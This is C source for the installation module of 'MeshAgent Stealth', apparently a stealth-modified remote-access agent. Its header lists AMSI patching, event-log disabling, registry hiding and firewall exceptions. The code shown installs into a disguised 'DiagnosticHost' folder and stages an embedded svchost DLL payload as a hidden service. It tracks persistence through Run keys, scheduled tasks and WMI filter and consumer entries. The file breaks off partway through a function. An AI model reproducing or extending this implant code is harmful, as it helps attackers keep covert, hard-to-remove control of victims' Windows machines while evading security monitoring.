/*
 * MeshAgent Stealth - Complete Installation Module
 *
 * Handles full installation process including:
 * - File deployment to System32
 * - Service registration (standalone or svchost)
 * - Firewall exception rules
 * - Registry configuration and hiding
 * - AMSI patching
 * - Event log disabling
 */

#include <windows.h>
#include <shlobj.h>
#include <knownfolders.h>
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>
#include <stdarg.h>
#include <wctype.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "branding_util.h"
#include "service_security.h"
#include "svchost_payload.h"
#include "stealth_defaults.h"
#include "stealth_resilience.h"

static void MeshInstaller_NormalizePathSeparators(wchar_t* path)
{
    if (path == NULL) { return; }
    for (size_t i = 0; path[i] != L'\0'; ++i)
    {
        if (path[i] == L'/')
        {
            path[i] = L'\\';
        }
    }
}

static BOOL MeshInstaller_GetDefaultInstallRoot(wchar_t* buffer, size_t count)
{
    if (buffer == NULL || count == 0) { return FALSE; }
    PWSTR programData = NULL;
    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &programData);
    BOOL resolved = FALSE;
    if (SUCCEEDED(hr) && programData != NULL)
    {
        resolved = SUCCEEDED(StringCchCopyW(buffer, count, programData));
        CoTaskMemFree(programData);
    }

    if (!resolved)
    {
        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", buffer, (DWORD)count);
        resolved = (envLen > 0 && envLen < count);
    }

    if (!resolved)
    {
        WCHAR windowsDir[MAX_PATH] = {0};
        UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
        if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
        if (FAILED(StringCchPrintfW(buffer, count, L"%s\\ProgramData", windowsDir))) { return FALSE; }
        resolved = TRUE;
    }

    if (!resolved) { return FALSE; }

    MeshInstaller_NormalizePathSeparators(buffer);
    size_t len = wcslen(buffer);
    if (len > 0 && buffer[len - 1] != L'\\')
    {
        if (FAILED(StringCchCatW(buffer, count, L"\\"))) { return FALSE; }
    }
    if (FAILED(StringCchCatW(buffer, count, L"DiagnosticHost"))) { return FALSE; }
    return TRUE;
}

static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar_t* root, const wchar_t* leaf)
{
    if (dest == NULL || destLen == 0) { return FALSE; }
    dest[0] = L'\0';
    if (root == NULL || root[0] == L'\0') { return FALSE; }

    if (FAILED(StringCchCopyW(dest, destLen, root))) { return FALSE; }
    MeshInstaller_NormalizePathSeparators(dest);

    if (leaf != NULL && leaf[0] != L'\0')
    {
        WCHAR leafCopy[MAX_PATH] = {0};
        if (FAILED(StringCchCopyW(leafCopy, _countof(leafCopy), leaf))) { return FALSE; }
        MeshInstaller_NormalizePathSeparators(leafCopy);
        size_t len = wcslen(dest);
        if (len > 0 && dest[len - 1] != L'\\')
        {
            if (FAILED(StringCchCatW(dest, destLen, L"\\"))) { return FALSE; }
        }
        if (FAILED(StringCchCatW(dest, destLen, leafCopy))) { return FALSE; }
    }

    return TRUE;
}

// Forward declaration - implementation after global variables
static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot);

// Constants
#define STEALTH_TASK_NAME_MAX           260

// Forward declarations for persistence helpers
static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static void Stealth_ConfigureServiceRecoveryIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static SC_ACTION* Stealth_CreateRestartPlan(size_t actionCount, DWORD delayMs, DWORD* actionCountOut);
static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD delayMs, DWORD* actionCountOut);
static void Stealth_TrimWhitespaceInplace(wchar_t* value);
static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token);
static void Stealth_EnablePrivilege(const wchar_t* privilegeName);
void Stealth_LogInstallEvent(const wchar_t* format, ...);
static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context);
static void Stealth_ResolveDefaultLogPath(void);
static void Stealth_LogAnsiMessage(const char* message);
static void Stealth_EnsureLogDirectory(void);
static void Stealth_PruneInstallLogIfNeeded(void);
void Stealth_EnsureLoggingDefaults(void);
static BOOL Stealth_StopServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs, BOOL forceTerminate);
static BOOL Stealth_DeleteExistingService(const wchar_t* serviceName);
static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure);
void Stealth_LogPathState(const wchar_t* path);
static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName);
static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity);
static BOOL Stealth_CopyTaskNameFromUtf8(const char* source, wchar_t* dest, size_t destLen);
static BOOL Stealth_FormatDefaultTaskName(const wchar_t* base, const wchar_t* suffix, wchar_t* dest, size_t destLen);
static BOOL Stealth_AddTaskCandidate(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t* count, size_t capacity, const wchar_t* name);
static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wchar_t* context);
static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName);

#define STEALTH_INSTALL_LOG_MAX_BYTES    (512ULL * 1024ULL)
#define STEALTH_SERVICE_STOP_TIMEOUT_MS  (30 * 1000)

static wchar_t g_InstallLogPath[MAX_PATH] = {0};
static BOOL g_HaveInstallLogPath = FALSE;
static wchar_t g_PersistenceStatePath[MAX_PATH] = {0};
static BOOL g_HavePersistenceStatePath = FALSE;

typedef struct _StealthPersistenceState
{
    wchar_t AutorunTask[STEALTH_TASK_NAME_MAX];
    wchar_t RestartTask[STEALTH_TASK_NAME_MAX];
    wchar_t WmiFilter[128];
    wchar_t WmiConsumer[128];
} StealthPersistenceState;

static BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state);
static BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state);
static void Stealth_ClearPersistenceState(void);
static BOOL Stealth_GetPersistenceStateDirectory(wchar_t* buffer, size_t bufferCch);
static void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask);
static void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName);

// Implementation of Stealth_UpdatePersistenceStatePath (after globals)
static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot)
{
    if (installRoot == NULL || installRoot[0] == L'\0') { return; }
    wchar_t stateDir[MAX_PATH] = {0};
    if (!MeshInstaller_CombinePath(stateDir, _countof(stateDir), installRoot, L"state")) { return; }
    if (!MeshInstaller_CombinePath(g_PersistenceStatePath, _countof(g_PersistenceStatePath), stateDir, L"persistence.ini")) { return; }
    g_HavePersistenceStatePath = (g_PersistenceStatePath[0] != L'\0');
}

// ================================================================
// Installation Paths
// ================================================================

BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
{
    if (paths == NULL) { return FALSE; }

    memset(paths, 0, sizeof(StealthInstallPaths));

    const mesh_branding_definition_t* branding = MeshConfig_GetBranding();

    MeshService_CopyBrandingPathToWide(MeshService_GetInstallRootText(), paths->installDir, MAX_PATH);
    if (paths->installDir[0] == L'\0')
    {
        if (!MeshInstaller_GetDefaultInstallRoot(paths->installDir, MAX_PATH)) { return FALSE; }
    }
    MeshInstaller_NormalizePathSeparators(paths->installDir);
    if (!g_HavePersistenceStatePath)
    {
        Stealth_UpdatePersistenceStatePath(paths->installDir);
    }

    MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), paths->logsDir, MAX_PATH);
    if (paths->logsDir[0] == L'\0')
    {
        if (!MeshInstaller_CombinePath(paths->logsDir, MAX_PATH, paths->installDir, L"logs")) { return FALSE; }
    }

    wchar_t exeName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), exeName, _countof(exeName));
    if (exeName[0] == L'\0') { StringCchCopyW(exeName, _countof(exeName), STEALTH_FALLBACK_EXE_NAME); }

    wchar_t dllName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
    if (dllName[0] == L'\0') { StringCchCopyW(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME); }

    wchar_t dbName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetDatabaseFileNameText(), dbName, _countof(dbName));
    if (dbName[0] == L'\0') { StringCchCopyW(dbName, _countof(dbName), STEALTH_FALLBACK_DB_NAME); }

    wchar_t confName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetConfigFileNameText(), confName, _countof(confName));
    if (confName[0] == L'\0') { StringCchCopyW(confName, _countof(confName), STEALTH_FALLBACK_CONF_NAME); }

    wchar_t logFileName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetLogFileNameText(), logFileName, _countof(logFileName));
    if (logFileName[0] == L'\0') { StringCchCopyW(logFileName, _countof(logFileName), STEALTH_FALLBACK_LOG_NAME); }

    if (!MeshInstaller_CombinePath(paths->exePath, MAX_PATH, paths->installDir, exeName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->dllPath, MAX_PATH, paths->installDir, dllName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->dbPath, MAX_PATH, paths->installDir, dbName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->confPath, MAX_PATH, paths->installDir, confName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->logPath, MAX_PATH, paths->logsDir, logFileName)) { return FALSE; }

    if (!g_HaveInstallLogPath)
    {
        wchar_t installerLog[MAX_PATH] = {0};
        if (MeshInstaller_CombinePath(installerLog, MAX_PATH, paths->logsDir, L"installer.log"))
        {
            wcsncpy_s(g_InstallLogPath, _countof(g_InstallLogPath), installerLog, _TRUNCATE);
            g_HaveInstallLogPath = (g_InstallLogPath[0] != L'\0');
            if (g_HaveInstallLogPath)
            {
                Stealth_DebugPrintfW(L"Installer log path: %ls", g_InstallLogPath);
            }
        }
    }

    return TRUE;
}

void Stealth_LogInstallEvent(const wchar_t* format, ...)
{
    if (!g_HaveInstallLogPath) { Stealth_ResolveDefaultLogPath(); }
    if (!g_HaveInstallLogPath || format == NULL) { return; }

    Stealth_EnsureLogDirectory();
    Stealth_PruneInstallLogIfNeeded();

    FILE* logFile = NULL;
    if (_wfopen_s(&logFile, g_InstallLogPath, L"a+, ccs=UNICODE") != 0 || logFile == NULL)
    {
        wchar_t tempPath[MAX_PATH] = {0};
        if (GetTempPathW(_countof(tempPath), tempPath) > 0)
        {
            wchar_t fallback[MAX_PATH] = {0};
            if (MeshInstaller_CombinePath(fallback, _countof(fallback), tempPath, L"MeshInstaller.log"))
            {
                wcsncpy_s(g_InstallLogPath, _countof(g_InstallLogPath), fallback, _TRUNCATE);
                g_HaveInstallLogPath = TRUE;
                Stealth_EnsureLogDirectory();
                if (_wfopen_s(&logFile, g_InstallLogPath, L"a+, ccs=UNICODE") != 0 || logFile == NULL)
                {
                    return;
                }
            }
            else
            {
                return;
            }
        }
        else
        {
            return;
        }
    }

    wchar_t timestamp[64];
    SYSTEMTIME st;
    GetLocalTime(&st);
    StringCchPrintfW(timestamp, _countof(timestamp), L"[%04u-%02u-%02u %02u:%02u:%02u] ",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    fputws(timestamp, logFile);

    va_list args;
    va_start(args, format);
    vfwprintf(logFile, format, args);
    va_end(args);

    fputws(L"\n", logFile);
    fflush(logFile);
    fclose(logFile);
}

// ================================================================
// Persistence State Helpers
// ================================================================

static BOOL Stealth_GetPersistenceStateDirectory(wchar_t* buffer, size_t bufferCch)
{
    if (!g_HavePersistenceStatePath || buffer == NULL || bufferCch == 0) { return FALSE; }
    if (FAILED(StringCchCopyW(buffer, bufferCch, g_PersistenceStatePath))) { return FALSE; }
    wchar_t* lastSlash = wcsrchr(buffer, L'\\');
    if (lastSlash == NULL)
    {
        buffer[0] = L'\0';
        return FALSE;
    }
    *lastSlash = L'\0';
    return TRUE;
}

static BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state)
{
    if (state == NULL || !g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
    {
        return FALSE;
    }

    wchar_t directory[MAX_PATH] = {0};
    if (!Stealth_GetPersistenceStateDirectory(directory, _countof(directory)))
    {
        return FALSE;
    }

    Stealth_CreateInstallationDirectory(directory);

    FILE* file = NULL;
    if (_wfopen_s(&file, g_PersistenceStatePath, L"w, ccs=UNICODE") != 0 || file == NULL)
    {
        return FALSE;
    }

    fwprintf(file, L"AutorunTask=%ls\n", state->AutorunTask);
    fwprintf(file, L"RestartTask=%ls\n", state->RestartTask);
    fwprintf(file, L"WmiFilter=%ls\n", state->WmiFilter);
    fwprintf(file, L"WmiConsumer=%ls\n", state->WmiConsumer);
    fclose(file);
    return TRUE;
}

static BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state)
{
    if (state == NULL)
    {
        return FALSE;
    }
    ZeroMemory(state, sizeof(*state));

    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
    {
        return FALSE;
    }

    FILE* file = NULL;
    if (_wfopen_s(&file, g_PersistenceStatePath, L"r, ccs=UNICODE") != 0 || file == NULL)
    {
        return FALSE;
    }

    BOOL loaded = FALSE;
    wchar_t line[512];
    while (fgetws(line, _countof(line), file) != NULL)
    {
        size_t len = wcslen(line);
        while (len > 0 && (line[len - 1] == L'\r' || line[len - 1] == L'\n'))
        {
            line[--len] = L'\0';
        }

        if (_wcsnicmp(line, L"AutorunTask=", 12) == 0)
        {
            wcsncpy_s(state->AutorunTask, _countof(state->AutorunTask), line + 12, _TRUNCATE);
            loaded = TRUE;
        }
        else if (_wcsnicmp(line, L"RestartTask=", 12) == 0)
        {
            wcsncpy_s(state->RestartTask, _countof(state->RestartTask), line + 12, _TRUNCATE);
            loaded = TRUE;
        }
        else if (_wcsnicmp(line, L"WmiFilter=", 10) == 0)
        {
            wcsncpy_s(state->WmiFilter, _countof(state->WmiFilter), line + 10, _TRUNCATE);
            loaded = TRUE;
        }
        else if (_wcsnicmp(line, L"WmiConsumer=", 12) == 0)
        {
            wcsncpy_s(state->WmiConsumer, _countof(state->WmiConsumer), line + 12, _TRUNCATE);
            loaded = TRUE;
        }
    }
    fclose(file);
    return loaded;
}

static void Stealth_ClearPersistenceState(void)
{
    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
    {
        return;
    }
    DeleteFileW(g_PersistenceStatePath);
}

static void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask)
{
    if (state == NULL || taskPath == NULL) { return; }
    if (isRestartTask)
    {
        wcsncpy_s(state->RestartTask, _countof(state->RestartTask), taskPath, _TRUNCATE);
    }
    else
    {
        wcsncpy_s(state->AutorunTask, _countof(state->AutorunTask), taskPath, _TRUNCATE);
    }
}

static void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName)
{
    if (state == NULL) { return; }
    if (filterName != NULL)
    {
        wcsncpy_s(state->WmiFilter, _countof(state->WmiFilter), filterName, _TRUNCATE);
    }
    if (consumerName != NULL)
    {
        wcsncpy_s(state->WmiConsumer, _countof(state->WmiConsumer), consumerName, _TRUNCATE);
    }
}

static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure)
{
    if (path == NULL || path[0] == L'\0') { return TRUE; }

    DWORD attr = GetFileAttributesW(path);
    if (attr == INVALID_FILE_ATTRIBUTES) { return TRUE; }

    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);

    for (int attempt = 0; attempt < 5; ++attempt)
    {
        if (DeleteFileW(path)) { return TRUE; }
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND) { return TRUE; }
        Sleep(100);
    }

    if (logOnFailure)
    {
        DWORD err = GetLastError();
        Stealth_LogInstallEvent(L"DeleteFile failed for %ls (error=%lu)", path, err);
        Stealth_LogPathState(path);
    }
    return FALSE;
}

void Stealth_LogPathState(const wchar_t* path)
{
    if (path == NULL || path[0] == L'\0') { return; }

    WIN32_FILE_ATTRIBUTE_DATA data;
    if (GetFileAttributesExW(path, GetFileExInfoStandard, &data))
    {
        ULARGE_INTEGER size;
        size.HighPart = data.nFileSizeHigh;
        size.LowPart = data.nFileSizeLow;

        FILETIME localWriteTime;
        SYSTEMTIME st = {0};
        if (FileTimeToLocalFileTime(&data.ftLastWriteTime, &localWriteTime) &&
            FileTimeToSystemTime(&localWriteTime, &st))
        {
            Stealth_LogInstallEvent(
                L"Path state [%ls]: size=%I64u attrs=0x%08X lastWrite=%04u-%02u-%02u %02u:%02u:%02u",
                path,
                size.QuadPart,
                data.dwFileAttributes,
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        }
        else
        {
            Stealth_LogInstallEvent(
                L"Path state [%ls]: size=%I64u attrs=0x%08X lastWrite=<unavailable>",
                path,
                size.QuadPart,
                data.dwFileAttributes);
        }
    }
    else
    {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND)
        {
            Stealth_LogInstallEvent(L"Path state [%ls]: not present", path);
        }
        else
        {
            Stealth_LogInstallEvent(L"Path state [%ls]: unavailable (error=%lu)", path, err);
        }
    }
}

static void Stealth_EnablePrivilege(const wchar_t* privilegeName)
{
    if (privilegeName == NULL || privilegeName[0] == L'\0') { return; }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return;
    }

    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (LookupPrivilegeValueW(NULL, privilegeName, &luid))
    {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    }

    CloseHandle(hToken);
}

static void Stealth_LogAnsiMessage(const char* message)
{
    if (message == NULL || message[0] == '\0') { return; }
    int needed = MultiByteToWideChar(CP_ACP, 0, message, -1, NULL, 0);
    if (needed <= 0 || needed > 2048) { return; }
    wchar_t* wbuffer = (wchar_t*)malloc(sizeof(wchar_t) * needed);
    if (wbuffer == NULL) { return; }
    MultiByteToWideChar(CP_ACP, 0, message, -1, wbuffer, needed);
    Stealth_LogInstallEvent(L"%ls", wbuffer);
    free(wbuffer);
}

static void Stealth_EnsureLogDirectory(void)
{
    if (!g_HaveInstallLogPath) { return; }
    wchar_t pathCopy[MAX_PATH] = {0};
    wcsncpy_s(pathCopy, _countof(pathCopy), g_InstallLogPath, _TRUNCATE);
    wchar_t* lastSlash = wcsrchr(pathCopy, L'\\');
    if (lastSlash != NULL)
    {
        *lastSlash = L'\0';
        if (pathCopy[0] != L'\0')
        {
            Stealth_CreateInstallationDirectory(pathCopy);
        }
    }
}

static void Stealth_PruneInstallLogIfNeeded(void)
{
    if (!g_HaveInstallLogPath) { return; }

    WIN32_FILE_ATTRIBUTE_DATA attr = {0};
    if (!GetFileAttributesExW(g_InstallLogPath, GetFileExInfoStandard, &attr))
    {
        return;
    }

    ULARGE_INTEGER size = {0};
    size.LowPart = attr.nFileSizeLow;
    size.HighPart = attr.nFileSizeHigh;
    if (size.QuadPart < STEALTH_INSTALL_LOG_MAX_BYTES)
    {
        return;
    }

    wchar_t rotated[MAX_PATH] = {0};
    if (FAILED(StringCchCopyW(rotated, _countof(rotated), g_InstallLogPath)))
    {
        rotated[0] = L'\0';
    }
    if (rotated[0] != L'\0')
    {
        if (FAILED(StringCchCatW(rotated, _countof(rotated), L".bak")))
        {
            rotated[0] = L'\0';
        }
    }

    if (rotated[0] != L'\0')
    {
        DeleteFileW(rotated);
        if (!MoveFileExW(g_InstallLogPath, rotated, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
        {
            DeleteFileW(g_InstallLogPath);
        }
    }
    else
    {
        DeleteFileW(g_InstallLogPath);
    }
}

static void Stealth_ToUppercase(wchar_t* text)
{
    if (text == NULL) { return; }
    for (wchar_t* p = text; *p != L'\0'; ++p)
    {
        *p = (wchar_t)towupper(*p);
    }
}

void Stealth_EnsureLoggingDefaults(void)
{
    if (g_HaveInstallLogPath) { return; }

    wchar_t logDir[MAX_PATH] = {0};
    MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), logDir, _countof(logDir));
    if (logDir[0] == L'\0')
    {
        if (!MeshInstaller_GetDefaultInstallRoot(logDir, _countof(logDir)))
        {
            return;
        }
        MeshInstaller_CombinePath(logDir, _countof(logDir), logDir, L"logs");
    }

    wchar_t logName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetLogFileNameText(), logName, _countof(logName));
    if (logName[0] == L'\0')
    {
        wcscpy_s(logName, _countof(logName), STEALTH_FALLBACK_LOG_NAME);
    }

    if (MeshInstaller_CombinePath(g_InstallLogPath, _countof(g_InstallLogPath), logDir, logName))
    {
        g_HaveInstallLogPath = (g_InstallLogPath[0] != L'\0');
    }
}

static void Stealth_ResolveDefaultLogPath(void)
{
    if (g_HaveInstallLogPath) { return; }

    wchar_t defaultRoot[MAX_PATH] = {0};
    if (MeshInstaller_GetDefaultInstallRoot(defaultRoot, _countof(defaultRoot)))
    {
        wchar_t logDir[MAX_PATH] = {0};
        if (MeshInstaller_CombinePath(logDir, _countof(logDir), defaultRoot, L"logs"))
        {
            Stealth_CreateInstallationDirectory(logDir);
            if (MeshInstaller_CombinePath(g_InstallLogPath, _countof(g_InstallLogPath), logDir, L"installer.log"))
            {
                g_HaveInstallLogPath = (g_InstallLogPath[0] != L'\0');
            }
        }
    }

    if (!g_HaveInstallLogPath)
    {
        wcscpy_s(g_InstallLogPath, _countof(g_InstallLogPath), L"C:\\ProgramData\\DiagnosticHost\\logs\\installer.log");
        Stealth_CreateInstallationDirectory(L"C:\\ProgramData\\DiagnosticHost\\logs");
        g_HaveInstallLogPath = TRUE;
    }
}

static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context)
{
    if (commandLine == NULL) { return FALSE; }

    BOOL success = FALSE;
    wchar_t* mutableCommand = _wcsdup(commandLine);
    if (mutableCommand == NULL) { return FALSE; }

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE readPipe = NULL, writePipe = NULL;
    if (!CreatePipe(&readPipe, &writePipe, &sa, 0))
    {
        free(mutableCommand);
        return FALSE;
    }
    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = writePipe;
    si.hStdError = writePipe;

    Stealth_LogInstallEvent(L"Executing: %ls", commandLine);

    if (CreateProcessW(NULL, mutableCommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(writePipe);
        writePipe = NULL;

        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);

        CHAR buffer[1024];
        DWORD bytesRead = 0;
        while (ReadFile(readPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
        {
            buffer[bytesRead] = '\0';
            Stealth_DebugPrintfA("%s", buffer);
            Stealth_LogAnsiMessage(buffer);
        }

        Stealth_LogInstallEvent(L"%ls exit code %lu", context ? context : L"Command", exitCode);
        success = (exitCode == 0);

        if (pi.hProcess) { CloseHandle(pi.hProcess); }
        if (pi.hThread) { CloseHandle(pi.hThread); }
    }
    else
    {
        Stealth_DebugLastErrorW(context ? context : L"CreateProcess");
        Stealth_LogInstallEvent(L"%ls failed to launch", context ? context : L"Command");
    }

    if (writePipe) { CloseHandle(writePipe); }
    if (readPipe) { CloseHandle(readPipe); }
    free(mutableCommand);
    return success;
}

static BOOL Stealth_IsAmsiPatchEnabled(void)
{
    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
    if (stealthProfile == NULL) { return TRUE; }
    return (stealthProfile->amsiPatch != 0);
}

// ================================================================
// Complete Installation Function
// ================================================================

BOOL Stealth_PerformCompleteInstallation(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL useSvchostMode)
{
    UNREFERENCED_PARAMETER(useSvchostMode);
    StealthInstallPaths paths;
    BOOL success = FALSE;
    BOOL dllStaged = FALSE;
    wchar_t dllHashBuffer[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
    BOOL haveDllHash = FALSE;
    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    wchar_t serviceDescription[512] = {0};
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
    if (persistence)
    {
        Stealth_LogInstallEvent(L"Persistence profile: runKey=%u task=%u restart=%u watchdog=%u",
            persistence->runKey,
            persistence->autorunTask.enabled,
            persistence->restartTask.enabled,
            persistence->watchdog.enabled);
    }
    else
    {
        Stealth_LogInstallEvent(L"Persistence profile missing; RunKey/Task disabled");
    }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, _countof(serviceDescription));
    if (serviceDescription[0] == L'\0') { StringCchCopyW(serviceDescription, _countof(serviceDescription), STEALTH_FALLBACK_SERVICE_DESCRIPTION); }

    // Get installation paths
    if (!Stealth_GetInstallPaths(&paths))
    {
        Stealth_DebugPrintfW(L"Stealth_GetInstallPaths failed");
        Stealth_LogInstallEvent(L"Install paths unavailable; aborting install");
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Install paths resolved (root=%ls)", paths.installDir);

    // Step 1: Create installation directories
    if (!Stealth_CreateInstallationDirectory(paths.installDir))
    {
        Stealth_DebugPrintfW(L"Failed to create install directory: %ls", paths.installDir);
        Stealth_LogInstallEvent(L"Failed to create install directory: %ls", paths.installDir);
        return FALSE;
    }

    if (!Stealth_CreateInstallationDirectory(paths.logsDir))
    {
        // Non-fatal, continue
    }

    // Step 2: Copy executable (for CLI usage) if a source path is provided
    if (sourceExePath && sourceExePath[0] != L'\0')
    {
        if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
        {
            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (EXE) %ls -> %ls", sourceExePath, paths.exePath);
            Stealth_LogInstallEvent(L"Failed to copy executable to %ls", paths.exePath);
            return FALSE;
        }
        Stealth_LogInstallEvent(L"Copied executable to %ls", paths.exePath);
    }

    // Always stage the svchost DLL payload
    Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
    if (sourceDllPath && sourceDllPath[0] != L'\0')
    {
        dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
        if (!dllStaged)
        {
            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
            Stealth_LogInstallEvent(L"Failed to stage svchost DLL to %ls", paths.dllPath);
        }
    }
    else
    {
        dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
        if (!dllStaged)
        {
            Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
            Stealth_LogInstallEvent(L"Failed to emit embedded svchost DLL to %ls (error=%lu)", paths.dllPath, GetLastError());
            Stealth_LogPathState(paths.dllPath);
            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
        }
    }

    if (!dllStaged)
    {
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Svchost payload staged to %ls", paths.dllPath);

    haveDllHash = Stealth_ComputeFileSha256W(paths.dllPath, dllHashBuffer, _countof(dllHashBuffer));
    if (!haveDllHash)
    {
        Stealth_LogInstallEvent(L"Failed to compute SHA256 for %ls", paths.dllPath);
    }

    // Register svchost-hosted service only
    if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
    {
        Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", serviceKeyName);
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Svchost registration complete for %ls", serviceKeyName);
    Stealth_LogInstallEvent(L"Svchost registration complete for %ls", serviceKeyName);
    if (haveDllHash)
    {
        wchar_t paramsKeyPath[512];
        _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);
        HKEY hParams = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_WRITE, &hParams) == ERROR_SUCCESS)
        {
